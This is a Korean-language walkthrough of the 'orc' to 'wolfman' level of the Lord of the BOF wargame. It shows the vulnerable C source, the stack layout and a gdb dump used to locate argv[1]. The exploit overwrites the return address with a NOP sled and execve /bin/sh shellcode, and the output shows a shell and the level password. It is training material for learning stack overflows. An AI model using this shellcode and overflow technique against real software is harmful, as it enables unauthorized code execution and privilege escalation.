============================================================================================================
[lob] orc
============================================================================================================


.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :Segmentation fault;

    :argv[1] 주소 확인;

    :RET 주소를 argv[1] 주소로 변경하여 공격 진행;
    
    stop

    @enduml


|

Source Analysis
============================================================================================================

해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
    */

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

    // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
    }

|

Memory Structure
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 됩니다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- strcpy
    SFP     (4byte)
    RET     (4byte)
    argc    (4byte)
    argv    (4byte)
    ----------------
    HIGH    
    ================

|

Segmentation fault
============================================================================================================

strcpy로 인해 입력한 값이 버퍼보다 클 경우 오버플로우가 발생됩니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ ./wolfman `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./wolfman `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================

argv[1] 주소 확인
------------------------------------------------------------------------------------------------------------

앞의 조건에 argv[1][47]값이 \\xbf인지 확인하기 때문에, gdb를 이용하여 argv[1]이 가리키는 주소를 찾습니다.

.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/orc/wolfman1 `python -c 'print "a"*47+"\xbf"'`
    /bin/bash: /home/goblin/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()

    (gdb) i reg $esp
    esp            0xbffffae8       -1073743128

    (gdb) i reg $ebp
    ebp            0xbffffb08       -1073743096

    (gdb) x/100x $esp

    ==========================================================================
    0xbffffae8:     0xbffffb08      0x400309cb      0x00000002      0xbffffb34
    0xbffffaf8:     0xbffffb40      0x40013868      0x00000002      0x08048450
    0xbffffb08:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffffb18:     0xbffffb34      0x08048390      0x0804861c      0x4000ae60
    0xbffffb28:     0xbffffb2c      0x40013e90      0x00000002      0xbffffc2e
    0xbffffb38:     0xbffffc43      0x00000000      0xbffffc74      0xbffffc96
    0xbffffb48:     0xbffffca0      0xbffffcae      0xbffffccd      0xbffffcd9
    0xbffffb58:     0xbffffcf2      0xbffffd0e      0xbffffd2d      0xbffffd38
    0xbffffb68:     0xbffffd46      0xbffffd88      0xbffffd97      0xbffffdac
    0xbffffb78:     0xbffffdbc      0xbffffdc5      0xbffffde3      0xbffffdee
    0xbffffb88:     0xbffffdff      0xbffffe0d      0xbffffe1c      0xbffffe24
    0xbffffb98:     0x00000000      0x00000003      0x08048034      0x00000004
    0xbffffba8:     0x00000020      0x00000005      0x00000006      0x00000006
    0xbffffbb8:     0x00001000      0x00000007      0x40000000      0x00000008
    0xbffffbc8:     0x00000000      0x00000009      0x08048450      0x0000000b
    0xbffffbd8:     0x000001f8      0x0000000c      0x000001f8      0x0000000d
    0xbffffbe8:     0x000001f8      0x0000000e      0x000001f8      0x00000010
    0xbffffbf8:     0x0fabfbff      0x0000000f      0xbffffc29      0x00000000
    0xbffffc08:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc18:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc28:     0x38366900      0x682f0036      0x2f656d6f      0x2f63726f
    0xbffffc38:     0x6f772f2e      0x616d666c      0x6100336e      0x61616161
                                                      ^               ^
    0xbffffc48:     0x61616161      0x61616161      0x61616161      0x61616161
                      ^               ^               ^ argv[1] = 0xbffffc53
    0xbffffc58:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffc68:     0x61616161      0x61616161      0x00bf6161      0x5353454c
    ==========================================================================

|

RET 주소를 argv[1] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- "\x90"*19 + shellcode
    SFP     (4byte)  <- shellcode
    RET     (4byte)  <- argv[1] address
    argc    (4byte)
    argv    (4byte)
    ----------------
    HIGH    
    ================

|

오버플로우시 RET 주소를 argv[1]의 주소로 변경하여 해당 쉘코드가 실행되도록 합니다. argv[1]의 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있습니다.

nop (19 byte) + shellcode (25 byte) + argv[1] address

.. code-block:: console

    $ ./wolfman `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x43\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀L▒▒▒
    Segmentation fault

    $ ./wolfman `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x53\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀S▒▒▒

    bash$ whoami
    wolfman
    bash$ my-pass
    euid = 505
    love eyuna








